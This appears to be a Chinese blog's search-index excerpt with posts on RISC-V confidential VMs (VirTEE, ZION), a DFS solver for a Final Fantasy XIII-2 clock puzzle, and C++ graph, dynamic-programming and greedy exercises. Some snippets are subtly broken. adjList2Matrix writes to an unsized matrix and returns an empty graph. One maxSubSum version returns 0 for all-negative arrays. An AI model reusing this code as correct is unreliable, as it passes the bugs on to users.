Monitor 的进入 Enclave 函数。\nSecurity Monitor 通过这个 id 找到对应的 Enclave，并通过设置对应的寄存器对这块内存区域进行标识。在此之后，Security Monitor 将会使用一个密钥对这块 Enclave 的签名进行验证。如果失败的话，Security Monitor 将会拒绝创建 Enclave，否则它将进行上下文切换并跳转到 Enclave Monitor 的入口执行。\nEnclave Monitor 接收从 Security Monitor 传递过来的三个参数：CPU 核心 id、包含所有设备信息的设备树、Enclave 内存的起始地址。\nEnclave Monitor 初始化必要的虚拟机环境：如二阶页表和虚拟设备。外设被分配并且绑定到虚拟机中。\nEnclave Monitor 跳转到虚拟机的入口点开始执行。\nEnclave 内的虚拟机就此运行在 Enclave Monitor 的控制之下。虚拟机因此可以通过 Enclave Monitor 提供的服务接口实现虚拟机热迁移和认证服务等。\n\n内存机密性和完整性保护内存机密性和完整性保护基于 Enclave 之间的隔离来实现，一条访存指令只有只有当该指令的地址和访存的目标地址位于同一个 Enclave 范围内时，访存才能成功。同样的，由于没有内存加密，无法抵御冷启动等物理攻击。\n寄存器状态保护由于 Enclave Monitor 担当了 Enclave 内虚拟机的 Hypervisor 的角色，因此虚拟机的寄存器状态信息保存在 Enclave Monitor 内存中，也就是 Enclave 范围内。因此借由 Enclave 的内存隔离机制，能够有限防止宿主机对虚拟机的寄存器状态进行窥探。\n参考文献\nJ. Wang, P. Mahmoody, F. Brasser, P. Jauemig, A.-R. Sadeghi, D. Yu, D. Pan, and Y. Zhang, “Virtee: A full backward-compatible tee with native live migration and secure i/o,” in Proceedings o f the 59th ACM/IEEE Design Automation Conference, 2022, pp. 241-246.\n\nZION硬件/固件扩展ZION 设计的创新点在于它无需任何的硬件扩展，可直接在现有的商用 RISC-V 处理器上工作。它的扩展主要是为 M-mode 下的固件（如 OpenSBI）引入安全模块 SM，负责 CVM 的安全资源和状态管理。和 VirTEE 类似，SM 也是作为 CVM 的 Hypervisor 而存在，只不过和 VirTEE 每个 CVM 配备一个专属的 Enclave Monitor 不同，ZION 采用的是一种集中式的管理方案，即 SM 作为所有的 CVM 的 “Hypervisor”，同时直接运行在 M-mode 下，无需再次经过上下文切换到其它的特权级，即文中强调的创新点之一：短路径 CVM 模式（Short-path CVM mode）。\n\n内存机密性和完整性保护由于 ZION 主打的就是不用进行任何的硬件扩展，那内存隔离部分的实现自然是基于 RISC-V 的 PMP 机制，但是 PMP 所支持的隔离域的数量有限（通常为 16 个），因此文中采用了一种分层的内存管理机制。\n具体来说，在初始化时，SM 先通过配置 PMP 寄存器，从普通内存中划分出一段安全内存作为安全内存池。在每次 CPU 在进入 CVM-mode 前（即切换到 CVM 上下文开始执行前），SM 都对相关的 pmpcfg 寄存器进行配置，使得 CVM 能够访问安全内存。不同的 CVM 共用一个安全内存池中的内存，那么这就需要考虑到不同 CVM 之间内存隔离的问题。因为 SM 充当了 Hypervisor 的角色，自然也要处理 CVM 的二阶缺页异常，在处理二阶缺页异常的过程中 SM 就会确保同一个物理页面不会被分配给多个 CVM，以此实现 CVM 之间的隔离。其实这个过程和不可信 Hypervisor 管理普通 VM 二阶页表的过程是十分类似的。\n一个大的安全内存池分配给多个 CVM，同时还涉及的动态扩容的问题，文中采用的策略如下图所示：\n\n首先将一整个连续的安全内存池划分为多个 page cache 块，单个 page cache 包含多个页面，默认为 256KB，再这些块前后相连组织成双向循环链表的形式。分配策略总共分为三层：最顶层中 SM 直接尝试从发生缺页异常的 vCPU 对应的 page cache 中的页面进行分配；若耗尽则从链表中找出一个空闲块分配给当前 vCPU；若链表中的块也濒临耗尽，SM 则会向 Hypervisor 发起请求对安全内存池进行扩展的。整体而言策略还是比较清晰明了的。\n由于 SM 用于处理 CVM 的二阶缺页异常，因此 CVM 被分配的内存都是安全内存，通过 SM 设置 PMP 相关寄存器对安全内存的访问权限进行控制，保障了 CVM 的内存机密性和完整性。同样的，由于没有内存加密，无法抵御冷启动等物理攻击。\n寄存器状态保护ZION 采用一种“双 vCPU 状态”的设计实现寄存器保护。具体来说，CVM 的一个 vCPU 包含两个 vCPU 数据结构，一个存储在 SM 的内存中，称作 secure vCPU；另一个存储在 Hypervisor 的内存中，称作 shared vCPU。CVM 的虚拟机退出和进入的上下文切换过程中，vCPU 的状态保存在 secure vCPU 中。但是当遇到如 MMIO 等需要 Hypervisor 协助的场景时，Hypervisor 通过 MMIO 读取到的数据会写入 shared vCPU 中，在切换回到 CVM 执行时，SM 首先从 secure vCPU 中恢复 CVM 的寄存器状态，然后选择性地从 shared vCPU 中读取需要的寄存器状态（如 MMIO 读取的返回值），更新到 CPU 中。在这个过程中，还可以引入一个简单的机制对读取数据的合法性进行检查。\n由于 CVM 上下文切换保留恢复的寄存器状态存储在 SM 所属的内存中，Hypervisor 无法进行读写，因此实现了寄存器状态的保护。\n参考文献\nJie Wang, Juan Wang, Yinqian Zhang, “ZION: A Practical Confidential Virtual Machine Architecture on Commodity RISC-V Processors,” in Proceedings o f the 62th ACM/IEEE Design Automation Conference, 2025.\n\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"用DFS解决最终幻想13-2时钟谜题","url":"/2022/08/08/%E7%94%A8DFS%E8%A7%A3%E5%86%B3%E6%9C%80%E7%BB%88%E5%B9%BB%E6%83%B313-2%E6%97%B6%E9%92%9F%E8%B0%9C%E9%A2%98/","content":"最近在补 XGP 中的最终幻想13-2时，遇到一个时钟谜题，感觉挺有意思，就像尝试用搜索算法将其解决。\n\n问题描述如下图所示，有一个时钟，包含个结点，每个节点有一个数字标识，玩家最开始可以任意选择一个结点，选择后，该结点被消除且指针会指向该结点的位置，根据该节点的数字值 n 分裂为两根指针分别向顺时针方向和逆时针方向旋转 n 个的单位长度。此后每次玩家只能选择指针指向的结点，选择结点后结点被消除，两指针合并指向选择结点的位置并按上述描述进行分裂和旋转，玩家需要将所有节点消除才能胜利。\n注：玩家无法选择已经被消除的结点，若分裂旋转后的两指针均位于已被消除的结点位置，则判定游戏失败。\n\n算法思路本问题很容易想到利用深度优先搜索来解决，选择一个结点作为开始，如第一次选择 12 点钟位置的结点，（以下为了方便，按结点在时钟中排布位置 n 称作结点 n）该结点值为 5，则选中后分别向顺时针和逆时针方向旋转到达结点 5 和 结点 7，这就产生了两个分支（相当于二叉树的左右子树），分别选择这两个结点继续搜索，若结点到达了一个已被访问过的结点（即该结点已被消除），则终止该方向上的搜索，并进行回溯，将路径上的该结点删除，并将访问标志复原。\n若路径上的结点个数已经达到 12，即所有节点均被成功消除，则该路径为一个解路径，将该结果保存并回溯继续进行搜索，直到尝试了所有可能性，算法结束。\n完整代码#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;class Solution &#123;private:    int n;    vector&lt;int&gt; path; // 搜索路径    vector&lt;vector&lt;int&gt;&gt; res; // 成功路径    void dfs(vector&lt;int&gt;&amp; sequences, vector&lt;bool&gt;&amp; visited, int ind) &#123;        if (visited[ind]) &#123; // 已访问过            return;        &#125;        path.emplace_back(ind);        visited[ind] = true;        if (path.size() == n) &#123; // 成功访问所有元素            res.emplace_back(path);        &#125;        int p1 = (ind - sequences[ind] + n) % n; // 逆时针方向旋转后的下标        int p2 = (ind + sequences[ind]) % n; // 顺时针方向旋转后的下标        if (p1 == p2) &#123;            dfs(sequences, visited, p1);        &#125;        else &#123;            dfs(sequences, visited, p1);            dfs(sequences, visited, p2);        &#125;        // 回溯        path.pop_back();        visited[ind] = false;    &#125;public:    vector&lt;vector&lt;int&gt;&gt; clockPuzzle(vector&lt;int&gt;&amp; sequences) &#123;        n = sequences.size();        vector&lt;bool&gt; visited;        for (int i = 0; i &lt; n; ++i) &#123; // 选取一个结点作为开始结点            visited.assign(n, false); // 重置visited数组             dfs(sequences, visited, i);        &#125;        return res;    &#125;&#125;;int main() &#123;    Solution S;    vector&lt;int&gt; sequences = &#123; 5,5,3,6,2,1,4,3,4,5,3,4 &#125;;    auto res = S.clockPuzzle(sequences);    for (const auto&amp; re : res) &#123;        for (const auto&amp; r : re) &#123;            cout &lt;&lt; r &lt;&lt; &quot; &quot;;        &#125;        cout &lt;&lt; endl &lt;&lt; endl;    &#125;&#125;\n结果分析以下为示例图中问题的所有解路径，经验证，符合条件。\n\n","categories":["数据结构与算法"],"tags":["游戏","算法"]},{"title":"数据结构编程题 图","url":"/2023/08/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%9B%BE/","content":"图定义邻接表struct ArcNode &#123; // 边结点\tint verIdx, weight;\tArcNode* next;\tArcNode(int verIdx, int weight, ArcNode* next) : verIdx(verIdx), weight(weight), next(next) &#123;&#125;&#125;;struct VNode &#123; // 顶点结点\tchar vertex;\tArcNode* first;&#125;;struct AlGraph &#123;\tvector&lt;VNode&gt; VNodes;&#125;;\n邻接矩阵struct MGraph &#123;\tvector&lt;char&gt; vertices; // 顶点集\tvector&lt;vector&lt;int&gt;&gt; edges; // 邻接矩阵&#125;;\n邻接表转邻接矩阵题目描述写出从图的邻接表转化为邻接矩阵的算法。\n解题代码MGraph adjList2Matrix(AlGraph&amp; AG) &#123;\tint n = AG.VNodes.size();\tMGraph MG;\tvector&lt;char&gt; vertices;\tvector&lt;vector&lt;int&gt;&gt; edges;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tvertices.emplace_back(AG.VNodes[i].vertex);\t&#125;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tArcNode* arc = AG.VNodes[i].first;\t\twhile (arc != nullptr) &#123;\t\t\tedges[i][arc-&gt;verIdx] = arc-&gt;weight;\t\t\tarc = arc-&gt;next;\t\t&#125;\t&#125;\treturn MG;&#125;\n是否存在EL路径题目描述已知无向连通图 G 由顶点集 V 和 边集 E 组成，当 G 中度为奇数的结点个数为不大于 2 的偶数时，G 存在包含所有边且长度为 |E| 的路径（称为 EL 路径），假设图采用邻接矩阵存储。请设计算法，判断 G 是否存在 EL 路径。\n解题代码bool isExistEL(MGraph&amp; G) &#123;\tint n = G.vertices.size(), cnt = 0;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tint deg = 0;\t\tfor (int j = 0; j &lt; n; ++j) &#123;\t\t\tdeg += G.edges[i][j] != 0;\t\t&#125;\t\tcnt += deg % 2;\t&#125;\treturn cnt == 0 || cnt == 2;&#125;\n判断无向图是否为树题目描述设计一个算法，判断一个无向图 G 是否为一棵树。\n解题代码bool dfs(MGraph&amp; G, int preVex, int curVex, vector&lt;bool&gt;&amp; visited) &#123;\tvisited[curVex] = true;\tfor (int i = 0; i &lt; G.vertices.size(); ++i) &#123;\t\tif (i == curVex) continue;\t\tif (visited[i] &amp;&amp; G.edges[curVex][i] != 0 &amp;&amp; i != preVex) &#123;\t\t\treturn false;\t\t&#125;\t\tif (!visited[i] &amp;&amp; G.edges[curVex][i] != 0) &#123;\t\t\tbool flag = dfs(G, curVex, i, visited);\t\t\tif (!flag) return false;\t\t&#125;\t&#125;\treturn true;&#125;bool isTree(MGraph&amp; G) &#123;\tint n = G.vertices.size();\tvector&lt;bool&gt; visited(n, false);\tauto flag = dfs(G, -1, 0, visited);\tif (!flag) return false;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tif (!visited[i]) &#123;\t\t\treturn false;\t\t&#125;\t&#125;\treturn true;&#125;\n非递归深度优先搜索题目描述写出图的深度优先搜索 DFS 算法的非递归算法（图采用邻接表形式存储）。\n解题代码void nonRecursiveDFS(AlGraph&amp; G, int startIdx) &#123;\tvector&lt;bool&gt; visited(G.VNodes.size(), false);\tstack&lt;int&gt; s;\ts.emplace(startIdx);\tvisited[startIdx] = true;\twhile (!s.empty()) &#123;\t\tint curIdx = s.top();\t\ts.pop();\t\tcout &lt;&lt; G.VNodes[curIdx].vertex &lt;&lt; &quot; &quot;;\t\tArcNode* arc = G.VNodes[curIdx].first;\t\twhile (arc != nullptr) &#123;\t\t\tif (!visited[arc-&gt;verIdx]) &#123;\t\t\t\ts.emplace(arc-&gt;verIdx);\t\t\t\tvisited[arc-&gt;verIdx] = true;\t\t\t&#125;\t\t\tarc = arc-&gt;next;\t\t&#125;\t&#125;&#125;\n判断是否存在一点到另一点的路径题目描述分别采用基于深度优先遍历和广度优先遍历算法判别以邻接表形式存储的有向图中是否存在由顶点 vi 到顶点 vj 的路径（i ≠ j）。注意，算法中涉及的图的基本操作必须在此存储结构上实现。\n解题代码DFSbool dfs(AlGraph&amp; G, int vi, int vj, vector&lt;bool&gt;&amp; visited) &#123;\tif (vi == vj) return true;\tvisited[vi] = true;\tArcNode* arc = G.VNodes[vi].first;\twhile (arc != nullptr) &#123;\t\tif (!visited[arc-&gt;verIdx] &amp;&amp; dfs(G, arc-&gt;verIdx, vj, visited)) &#123;\t\t\treturn true;\t\t&#125;\t\tarc = arc-&gt;next;\t&#125;\treturn false;&#125;bool hasPathDFS(AlGraph&amp; G, int vi, int vj) &#123;\tvector&lt;bool&gt; visited(G.VNodes.size(), false);\treturn dfs(G, vi, vj, visited);&#125;\nBFSbool hasPathBFS(AlGraph&amp; G, int vi, int vj) &#123;\tif (vi == vj) return true;\tvector&lt;bool&gt; visited(G.VNodes.size(), false);\tvisited[vi] = true;\tqueue&lt;int&gt; q;\tq.emplace(vi);\twhile (!q.empty()) &#123;\t\tint curIdx = q.front();\t\tq.pop();\t\tArcNode* arc = G.VNodes[curIdx].first;\t\twhile (arc != nullptr) &#123;\t\t\tif (arc-&gt;verIdx == vj) &#123;\t\t\t\treturn true;\t\t\t&#125;\t\t\tif (!visited[arc-&gt;verIdx]) &#123;\t\t\t\tvisited[arc-&gt;verIdx] = true;\t\t\t\tq.emplace(arc-&gt;verIdx);\t\t\t&#125;\t\t\tarc = arc-&gt;next;\t\t&#125;\t&#125;\treturn false;&#125;\n输出简单路径题目描述假设图用邻接表表示，设计一个算法，输出从顶点 vi 到顶点 vj 的所有简单路径。\n解题代码void printAllPathsDFS(AlGraph&amp; graph, int vi, int vj, vector&lt;bool&gt;&amp; visited, vector&lt;int&gt;&amp; path) &#123;\tvisited[vi] = true;\tpath.emplace_back(vi);\tif (vi == vj) &#123;\t\tfor (int i = 0; i &lt; path.size(); i++) &#123;\t\t\tcout &lt;&lt; path[i] &lt;&lt; &quot; &quot;;\t\t&#125;\t\tcout &lt;&lt; endl;\t&#125;\telse &#123;\t\tArcNode* arc = graph.VNodes[vi].first;\t\twhile (arc != nullptr) &#123;\t\t\tif (!visited[arc-&gt;verIdx]) &#123;\t\t\t\tprintAllPathsDFS(graph, arc-&gt;verIdx, vj, visited, path);\t\t\t&#125;\t\t\tarc = arc-&gt;next;\t\t&#125;\t&#125;\tvisited[vi] = false;\tpath.pop_back();&#125;void printAllPaths(AlGraph&amp; G, int vi, int vj) &#123;\tvector&lt;bool&gt; visited(G.VNodes.size(), false);\tvector&lt;int&gt; path;\tprintAllPathsDFS(G, vi, vj, visited, path);&#125;\n","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"算法分析与设计编程题 动态规划","url":"/2023/08/28/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","content":"矩阵连乘题目描述\n\n解题代码void printOptimalParens(vector&lt;vector&lt;int&gt;&gt;&amp; partition, int i, int j) &#123;\tif (i == j) cout &lt;&lt; &quot;A&quot; &lt;&lt; i; // 单个矩阵，无需划分\telse &#123;\t\tcout &lt;&lt; &quot;(&quot;;\t\tprintOptimalParens(partition, i, partition[i][j]);\t\tprintOptimalParens(partition, partition[i][j] + 1, j);\t\tcout &lt;&lt; &quot;)&quot;;\t&#125;&#125;// nums[i]: nums[0]为矩阵A1的行数，nums[i](i &gt;= 1)表示矩阵Ai的列数// 如输入为 nums = &#123; 30,35,15,5,10,20,25 &#125;，代表矩阵行列数如下：// A1: 30 * 35, A2: 35 * 15, A3: 15 * 5, A4: 5 * 10, A5: 10 * 20, A6: 20 * 25int matrixChainOrder(vector&lt;int&gt;&amp; nums) &#123;\tint n = nums.size() - 1;\t// dp[i][j]表示矩阵链A[i～j]的最优解\tvector&lt;vector&lt;int&gt;&gt; dp(n + 1, vector&lt;int&gt;(n + 1, INT32_MAX));\t// partition[i][j]表示矩阵链A[i～j]最优解对应的划分k\tvector&lt;vector&lt;int&gt;&gt; partition(n + 1, vector&lt;int&gt;(n + 1));\tfor (int i = 1; i &lt;= n; ++i) &#123;\t\tdp[i][i] = 0; // 矩阵链长度为1时，最优解为0\t&#125;\tfor (int len = 2; len &lt;= n; ++len) &#123; // len为矩阵链长度\t\tfor (int i = 1; i + len - 1 &lt;= n; ++i) &#123; // 矩阵链左端点i\t\t\tint j = i + len - 1; // 矩阵链右端点j\t\t\tfor (int k = i; k &lt;= j - 1; ++k) &#123; // 划分点k\t\t\t\tint sum = dp[i][k] + dp[k + 1][j] + nums[i - 1] * nums[k] * nums[j];\t\t\t\tif (sum &lt; dp[i][j]) &#123; // 更新最优解\t\t\t\t\tdp[i][j] = sum;\t\t\t\t\tpartition[i][j] = k;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;\t&#125;\tprintOptimalParens(partition, 1, n); // 打印最优方案\treturn dp[1][n];&#125;\n最长公共子序列题目描述\n解题代码void printLCS(const string&amp; text1, vector&lt;vector&lt;char&gt;&gt;&amp; dir, int i, int j) &#123;    if (i == 0 || j == 0) return;    if (dir[i][j] == &#x27;S&#x27;) &#123; // 向左上移动        printLCS(text1, dir, i - 1, j - 1);        cout &lt;&lt; text1[i - 1]; // 递归后再输出字符，以实现反向    &#125;    else if (dir[i][j] == &#x27;U&#x27;) &#123; // 向上移动        printLCS(text1, dir, i - 1, j);    &#125;    else &#123; // 向左移动        printLCS(text1, dir, i, j - 1);    &#125;&#125;int longestCommonSubsequence(string text1, string text2) &#123;    int m = text1.size(), n = text2.size();    // dp[i][j]表示text1[0～i-1]和text2[0～i-1]的LCS    vector&lt;vector&lt;int&gt;&gt; dp(m + 1, vector&lt;int&gt;(n + 1, 0));    // dir[i][j]记录得到LCS的移动方向，以便构造最优解    vector&lt;vector&lt;char&gt;&gt; dir(m + 1, vector&lt;char&gt;(n + 1, &#x27;*&#x27;));    for (int i = 1; i &lt;= m; ++i) &#123;        for (int j = 1; j &lt;= n; ++j) &#123;            if (text1[i - 1] == text2[j - 1]) &#123;                dp[i][j] = dp[i - 1][j - 1] + 1;                dir[i][j] = &#x27;S&#x27;;            &#125;            else if (dp[i - 1][j] &gt;= dp[i][j - 1]) &#123;                dp[i][j] = dp[i - 1][j];                dir[i][j] = &#x27;U&#x27;;            &#125;            else &#123;                dp[i][j] = dp[i][j - 1];                dir[i][j] = &#x27;L&#x27;;            &#125;        &#125;    &#125;    printLCS(text1, dir, m, n); // 构造最优解    return dp[m][n];&#125;\n最大子段和题目描述\n解题代码分治法int dividedMaxSubSum(vector&lt;int&gt;&amp; nums, int left, int right) &#123;\tif (left == right) return nums[left]; // 单个元素最大子段和为该元素的值\tint mid = left + (right - left) / 2;\tint lSum = dividedMaxSubSum(nums, left, mid); // 划分左端子数组的最大子段和\tint rSum = dividedMaxSubSum(nums, mid + 1, right); // 划分右端子数组的最大子段和\t// 计算穿过划分点的子数组左端的最大子段和\tint midL = 0, maxMidL = INT32_MIN;\tfor (int i = mid; i &gt;= left; --i) &#123;\t\tmidL += nums[i];\t\tmaxMidL = max(maxMidL, midL);\t&#125;\t// 计算穿过划分点的子数组右端的最大子段和\tint midR = 0, maxMidR = INT32_MIN;\tfor (int i = mid + 1; i &lt;= right; ++i) &#123;\t\tmidR += nums[i];\t\tmaxMidR = max(maxMidR, midR);\t&#125;\t// 子数组的最大子段和为三者之间最大的一个\treturn max(maxMidL + maxMidR, max(lSum, rSum));&#125;int maxSubSum(vector&lt;int&gt;&amp; nums) &#123;\tint n = nums.size();\treturn dividedMaxSubSum(nums, 0, n - 1);&#125;\n动态规划int maxSubSum(vector&lt;int&gt;&amp; nums) &#123;\tint res = 0, sum = 0;\tfor (int i = 0; i &lt; nums.size(); ++i) &#123;\t\tif (sum &gt; 0) &#123;\t\t\tsum += nums[i];\t\t&#125;\t\t// 当前累计总和小于零，则包含该部分的子段必不可能为最大子段，可根据反证法证明：\t\t// 假设子段S为最大子段，且其包含总和为负的前缀子段s1，则将该前缀子段删去后得到的新子段S&#x27;的子段和必定大于S，与假设矛盾\t\telse &#123;\t\t\tsum = nums[i];\t\t&#125;\t\tres = max(res, sum);\t&#125;\treturn res;&#125;\n凸多边形最优三角剖分题目描述\n\n解题代码int minScoreTriangulation(vector&lt;int&gt;&amp; values) &#123;    int n = values.size();    vector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(n, 0));    for (int len = 3; len &lt;= n; ++len) &#123; // 多边形顶点序列长度len        for (int i = 0; i + len - 1 &lt; n; ++i) &#123; // 顶点序列左端点i            int j = i + len - 1; // 顶点序列右端点j            dp[i][j] = INT32_MAX;            for (int k = i + 1; k &lt; j; ++k) &#123; // 划分点k                int cost = dp[i][k] + dp[k][j] + values[i] * values[j] * values[k];                dp[i][j] = min(dp[i][j], cost);             &#125;        &#125;    &#125;    return dp[0][n - 1];&#125;\n0-1背包问题题目描述\n解题代码int knapsack01(vector&lt;int&gt;&amp; weights, vector&lt;int&gt;&amp; values, int c) &#123;\tint n = weights.size();\t// dp[i][j]表示可选商品为0～i，背包容量为j情况下的最优解\tvector&lt;vector&lt;int&gt;&gt; dp(n, vector&lt;int&gt;(c + 1, 0));\tfor (int j = weights[0]; j &lt;= c; ++j) &#123;\t\t// 若i=0，即可选商品只有0，此时最优解为：能否装下商品0 ? values[0] : 0\t\tdp[0][j] = values[0];\t&#125;\tfor (int i = 1; i &lt; n; ++i) &#123; // 可选商品0～i\t\tfor (int j = 1; j &lt;= c; ++j) &#123; // 背包容量j\t\t\tdp[i][j] = dp[i - 1][j]; // 不选择商品i\t\t\tif (j &gt;= weights[i]) &#123; // 若j &gt;= weight[i]，则可选择商品i\t\t\t\t// 取两种情况（选择或不选择商品i）下的最优解\t\t\t\tdp[i][j] = max(dp[i][j], dp[i - 1][j - weights[i]] + values[i]);\t\t\t&#125;\t\t&#125;\t&#125;\treturn dp[n - 1][c];&#125;\n最优二叉搜索树题目描述\n解题代码// pNonLeaves[i](i &gt;= 1)表示非叶结点i的搜索概率，pLeaves[i](i &gt;= 0)表示叶子结点i的搜索概率// 如输入为 pNonLeaves = &#123; 0.0,0.15,0.10,0.05,0.10,0.20 &#125;// 表示非叶结点i的搜索概率p[1～5] = [ 0.15,0.10,0.05,0.10,0.20 ]（原数组首个0为占位用，无实际含义）// 如输入为 pLeaves = &#123; 0.05,0.10,0.05,0.05,0.05,0.10 &#125;// 表示非叶结点i的搜索概率q[0～5] = [ 0.05,0.10,0.05,0.05,0.05,0.10 ]double optimalBST(vector&lt;double&gt;&amp; pNonLeaves, vector&lt;double&gt;&amp; pLeaves) &#123;    int n = pNonLeaves.size() - 1; // 非叶节点的个数n    // dp[i][j]表示根据结点序列pNonLeaves[i～j]和pLeaves[i～j]构成的最优解（子树）    // dp[i][i-1]代表只含有叶结点i-1的子树（不含非叶节点）    vector&lt;vector&lt;double&gt;&gt; dp(n + 2, vector&lt;double&gt;(n + 1, DBL_MAX));    // root[i][j]表示dp[i][j]对应的子树的根节点，可根据其构造最优二叉搜索树    vector&lt;vector&lt;int&gt;&gt; root(n + 1, vector&lt;int&gt;(n + 1));    // pSum[i][j]表示结点序列pNonLeaves[i～j]和pLeaves[i～j]的概率总和    vector&lt;vector&lt;double&gt;&gt; pSum(n + 2, vector&lt;double&gt;(n + 1));    for (int i = 1; i &lt;= n + 1; ++i) &#123; // 初始化dp和pSum        dp[i][i - 1] = pLeaves[i - 1];        pSum[i][i - 1] = pLeaves[i - 1];    &#125;    for (int len = 1; len &lt;= n; ++len) &#123; // 结点序列长度len        for (int i = 1; i + len - 1 &lt;= n; ++i) &#123; // 序列左端点i            int j = i + len - 1; // 序列右端点j            pSum[i][j] = pSum[i][j - 1] + pNonLeaves[j] + pLeaves[j]; // 递推计算结点序列区间概率和            for (int r = i; r &lt;= j; ++r) &#123; // 将非叶结点r选作根节点                double cost = dp[i][r - 1] + dp[r + 1][j] + pSum[i][j]; // 该情况下的搜索代价                if (cost &lt; dp[i][j]) &#123; // 更新最优解                    dp[i][j] = cost;                    root[i][j] = r;                &#125;            &#125;        &#125;    &#125;    return dp[1][n];&#125;","categories":["数据结构与算法"],"tags":["C++","算法","数据结构"]},{"title":"算法分析与设计编程题 贪心算法","url":"/2023/09/02/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90%E4%B8%8E%E8%AE%BE%E8%AE%A1%E7%BC%96%E7%A8%8B%E9%A2%98%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/","content":"活动安排问题题目描述\n\n解题代码vector&lt;bool&gt; greedySelector(vector&lt;vector&lt;int&gt;&gt;&amp; intervals) &#123;    int n = intervals.size();    // 将活动区间按结束时间的从小到大排序    auto cmp = [](vector&lt;int&gt;&amp; interval1, vector&lt;int&gt;&amp; interval2) &#123;        return interval1[1] &lt; interval2[1];    &#125;;    sort(intervals.begin(), intervals.end(), cmp);    vector&lt;bool&gt; res(n, false);    // 结束时间最早的活动必定位于某个最优解之中    int minStart = intervals[0][1];    res[0] = true;    for (int i = 1; i &lt; n; ++i) &#123;        if (intervals[i][0] &gt;= minStart) &#123; // 将不重叠的活动加入最优解集            res[i] = true;            minStart = intervals[i][1];        &#125;    &#125;    return res;&#125;\n最优装载题目描述\n解题代码vector&lt;bool&gt; optimisedLoading(vector&lt;int&gt;&amp; weight, int c) &#123;\tint n = weight.size();\tvector&lt;bool&gt; select(n, false);\t// 定义一个小顶优先队列，使得对于i，若其weight[i]最小，则排在队列的队头\tpriority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; q;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\t// 构建二元组&lt;重量,下标&gt;并放入优先队列\t\tq.emplace(weight[i], i);\t&#125;\tfor (int i = 0; i &lt; n; ++i) &#123;\t\tauto [w, idx] = q.top(); // （C++17语法）取队头元素的w和对应下标\t\tq.pop();\t\tif (c &lt; w) break; // 无法继续装载\t\tselect[idx] = true; // 选择装载该货物\t\tc -= w; // 剩余载货量减少\t&#125;\treturn select;&#125;\n哈夫曼编码题目描述\n\n解题代码struct HuffmanNode &#123;\tint left, right; // 左右结点\tint parent; // 父结点\tint weight; // 权重\tchar data; // 数据\tHuffmanNode(int left = -1, int right = -1, int parent = -1, int weight = 0, char data = &#x27;*&#x27;)\t\t: left(left), right(right), parent(parent), weight(weight), data(data) &#123;&#125;&#125;;vector&lt;HuffmanNode&gt; createHuffmanTree(vector&lt;int&gt;&amp; weight, vector&lt;char&gt;&amp; data) &#123;\tint n = weight.size();\tvector&lt;HuffmanNode&gt; huffmanTree(2 * n);\t// 定义一个小顶优先队列，使得对于i，若其weight[i]最小，则排在队列的队头\tpriority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; q;\tfor (int i = 0; i &lt; n; ++i) &#123; // 初始化哈夫曼树和优先队列\t\thuffmanTree[i].data = data[i];\t\thuffmanTree[i].weight = weight[i];\t\tq.emplace(weight[i], i);\t&#125;\tfor (int i = 0; i &lt; n - 1; ++i) &#123;\t\tauto [weight1, idx1] = q.top(); // 取权值最小结点\t\tq.pop();\t\tauto [weight2, idx2] = q.top(); // 取权值第二小结点\t\tq.pop();\t\t// 创建两结点的父结点，其下标为n+i\t\thuffmanTree[idx1].parent = n + i;\t\thuffmanTree[idx2].parent = n + i;\t\t// 初始化该父结点的相关信息\t\thuffmanTree[n + i].left = idx1;\t\thuffmanTree[n + i].right = idx2;\t\thuffmanTree[n + i].weight = weight1 + weight2;\t\t// 将该父结点的&lt;权值,下标&gt;加入优先队列，以便进行贪心选择\t\tq.emplace(weight1 + weight2, n + i);\t&#125;\treturn huffmanTree;&#125;void printHuffmanCode(vector&lt;HuffmanNode&gt;&amp; huffmanTree) &#123;\tstack&lt;int&gt; s;\tfor (int i = 0; i &lt; huffmanTree.size() / 2; ++i) &#123;\t\tint cur = i; // 当前结点下标\t\tint pre = huffmanTree[cur].parent; // 当前结点的父结点的下标\t\twhile (pre != -1) &#123;\t\t\tif (huffmanTree[pre].left == cur) &#123;\t\t\t\ts.emplace(0); // 当前结点为其父结点的左孩子\t\t\t&#125;\t\t\telse &#123;\t\t\t\ts.emplace(1); // 当前结点为其父结点的右孩子\t\t\t&#125;\t\t\t// 轮换下标\t\t\tcur = pre;\t\t\tpre = huffmanTree[cur].parent;\t\t&#125;\t\t// 打印相应的哈夫曼编码\t\tcout &lt;&lt; huffmanTree[i].data &lt;&lt; &quot; &quot;;\t\twhile (!s.empty()) &#123;\t\t\tcout &lt;&lt; s.top();\t\t\ts.pop();\t\t&#125;\t\tcout &lt;&lt; endl;\t&#125;&#125;\n单源最短路径题目描述\n解题代码图的定义struct MGraph &#123;\tvector&lt;char&gt; vertices; // 顶点数组\tvector&lt;vector&lt;int&gt;&gt; edges; // 邻接矩阵&#125;;\nBellmanFord此算法可适用于含有负权值边的图。\n// G:图\tstart:源点\tdist:最短路径bool BellmanFord(MGraph&amp; G, int start, vector&lt;int&gt;&amp; dist) &#123;\tint n = G.vertices.size();\t// 初始化最短路径\tdist.assign(n, INT32_MAX);\tfor (int j = 0; j &lt; n; ++j) &#123;\t\tdist[j] = G.edges[start][j];\t&#125;\tfor (int t = 0; t &lt; n - 1; ++t) &#123; // 松弛次数t\t\tfor (int i = 0; i &lt; n; ++i) 